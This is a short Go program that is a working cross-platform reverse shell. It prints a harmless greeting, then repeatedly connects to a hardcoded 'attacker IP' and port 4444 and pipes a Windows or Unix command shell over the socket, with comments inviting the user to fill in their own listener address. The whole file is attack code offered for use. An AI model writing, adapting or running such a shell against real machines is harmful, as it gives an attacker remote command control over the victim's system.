package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
)

func main() {
	fmt.Println("hello there!")
	// CHANGE THESE
	//
	host := "192.168.230.128" // Your attacker IP (listener)
	port := "4444"            // Your listener port

	addr := host + ":" + port

	for {
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			// Retry every 5 seconds if connection fails
			// time.Sleep(5 * time.Second)  // uncomment if you import "time"
			continue
		}

		// Choose the right shell for the OS
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd.exe")
		} else {
			cmd = exec.Command("/bin/sh")
			// For fully interactive bash (better PTY if possible):
			// cmd = exec.Command("/bin/bash", "-i")
		}

		// Pipe stdin, stdout, stderr to the socket
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn

		_ = cmd.Run() // Run the shell
		conn.Close()
	}
}
